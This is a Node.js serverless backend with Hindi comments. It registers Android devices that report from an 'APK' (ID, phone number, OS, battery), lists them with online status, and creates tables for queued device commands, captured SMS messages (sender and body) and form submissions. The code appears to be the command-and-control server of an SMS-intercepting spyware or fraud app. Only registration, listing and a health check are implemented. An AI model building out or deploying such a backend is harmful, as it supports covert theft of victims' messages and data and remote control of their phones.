const path = require('path');
const sqlite3 = require('sqlite3').verbose();

// --- डेटाबेस सेटअप ---
const isVercel = process.env.VERCEL === '1' || process.env.VERCEL;
const dbPath = isVercel 
    ? '/tmp/database.sqlite'
    : path.join(__dirname, 'database.sqlite');

console.log('Database path:', dbPath);

const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err) {
        console.error("Error opening database", err.message);
    } else {
        console.log('Connected to SQLite database');
        db.serialize(() => {
            // Tables create करें
            db.run(`CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT UNIQUE NOT NULL, 
                device_name TEXT, 
                os_version TEXT, 
                phone_number TEXT, 
                battery_level INTEGER, 
                last_seen DATETIME NOT NULL, 
                created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT NOT NULL, 
                command_type TEXT NOT NULL, 
                command_data TEXT NOT NULL, 
                status TEXT NOT NULL DEFAULT 'pending', 
                created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS sms_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT NOT NULL, 
                sender TEXT NOT NULL, 
                message_body TEXT NOT NULL, 
                received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS form_submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT, 
                device_id TEXT NOT NULL, 
                custom_data TEXT NOT NULL, 
                submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
            )`);
            
            db.run(`CREATE TABLE IF NOT EXISTS global_settings (
                setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, 
                setting_value TEXT
            )`);
        });
    }
});

// Helper functions
const getBody = (req) => {
    return new Promise((resolve, reject) => {
        let data = '';
        req.on('data', chunk => { data += chunk; });
        req.on('end', () => {
            try {
                resolve(data ? JSON.parse(data) : {});
            } catch (e) {
                reject(e);
            }
        });
    });
};

const dbAll = (query, params) => {
    return new Promise((resolve, reject) => {
        db.all(query, params, (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
        });
    });
};

const dbGet = (query, params) => {
    return new Promise((resolve, reject) => {
        db.get(query, params, (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
};

const dbRun = (query, params) => {
    return new Promise((resolve, reject) => {
        db.run(query, params, function(err) {
            if (err) reject(err);
            else resolve({ lastID: this.lastID, changes: this.changes });
        });
    });
};

// --- मुख्य सर्वर लॉजिक ---
module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    const { method, url } = req;
    
    try {
        const urlObj = new URL(url, `http://${req.headers.host}`);
        const path = urlObj.pathname;
        const urlParts = path.split('/').filter(part => part !== '');
        
        console.log(`${method} ${path}`);
        
        let reqBody = {};
        if (['POST', 'PUT', 'DELETE'].includes(method)) {
            try {
                reqBody = await getBody(req);
            } catch (e) {
                console.error('Error parsing request body:', e);
            }
        }
        
        // --- API ENDPOINTS ---
        
        // 1. Device Registration - FIXED: अब पूरी तरह अपडेट होगा
        if (method === 'POST' && path === '/api/device/register') {
            const { device_id, device_name, os_version, battery_level, phone_number } = reqBody;
            
            if (!device_id) {
                return res.status(400).json({ error: 'Device ID is required' });
            }
            
            const now = new Date().toISOString();
            
            try {
                const existingDevice = await dbGet('SELECT * FROM devices WHERE device_id = ?', [device_id]);
                
                if (existingDevice) {
                    // FIXED: अब सभी फील्ड्स अपडेट होंगे
                    await dbRun(
                        'UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?',
                        [device_name || existingDevice.device_name, 
                         os_version || existingDevice.os_version, 
                         battery_level || existingDevice.battery_level, 
                         phone_number || existingDevice.phone_number, 
                         now, 
                         device_id]
                    );
                    console.log(`Device updated: ${device_id}`);
                } else {
                    // FIXED: नए डिवाइस को हमेशा रजिस्टर करें, चाहे offline हो
                    await dbRun(
                        'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
                        [device_id, device_name, os_version, battery_level, phone_number, now, now]
                    );
                    console.log(`New device registered: ${device_id}`);
                }
                
                return res.status(200).json({ 
                    status: 'success', 
                    message: 'Device data received and updated.'  // ✅ APK expects this exact message
                });
            } catch (error) {
                console.error('Error in device registration:', error);
                return res.status(500).json({ 
                    status: 'error', 
                    message: 'Failed to register device' 
                });
            }
        }
        
        // 2. Get all devices - FIXED: स्थिर क्रम और हमेशा सभी डिवाइस दिखेंगे
        else if (method === 'GET' && path === '/api/devices') {
            try {
                const rows = await dbAll('SELECT * FROM devices ORDER BY created_at ASC');
                
                const now = new Date();
                const devicesWithStatus = rows.map(device => {
                    if (!device.last_seen) {
                        return { ...device, is_online: false };
                    }
                    
                    const lastSeen = new Date(device.last_seen);
                    const secondsDiff = (now - lastSeen) / 1000;
                    
                    // FIXED: अब status स्थिर रहेगा, बार-बार नहीं बदलेगा
                    // 20 सेकंड से कम = online, 20-40 = warning, 40+ = offline
                    let is_online;
                    if (secondsDiff < 20) {
                        is_online = true;
                    } else if (secondsDiff < 40) {
                        is_online = false; // लेकिन यह warning state हो सकता है
                    } else {
                        is_online = false;
                    }
                    
                    return {
                        device_id: device.device_id,
                        device_name: device.device_name,
                        os_version: device.os_version,
                        phone_number: device.phone_number,
                        battery_level: device.battery_level,
                        is_online: is_online,
                        created_at: device.created_at
                    };
                });
                
                return res.status(200).json(devicesWithStatus);
            } catch (error) {
                console.error('Error fetching devices:', error);
                return res.status(200).json([]); // FIXED: error में भी empty array return करें
            }
        }
        
        // Health check
        else if (path === '/api/health') {
            try {
                const deviceCount = await dbGet('SELECT COUNT(*) as count FROM devices', []);
                return res.status(200).json({ 
                    status: 'ok', 
                    timestamp: new Date().toISOString(),
                    database: 'connected',
                    device_count: deviceCount ? deviceCount.count : 0
                });
            } catch (error) {
                return res.status(200).json({ 
                    status: 'ok', 
                    timestamp: new Date().toISOString(),
                    database: 'error'
                });
            }
        }
        
        // Add other endpoints as needed...
        
        // Not Found
        else {
            return res.status(404).json({ 
                error: 'Not Found', 
                message: `Endpoint ${method} ${path} not found` 
            });
        }
        
    } catch (error) {
        console.error('Server error:', error);
        return res.status(500).json({ 
            error: 'Internal Server Error', 
            message: error.message
        });
    }
};
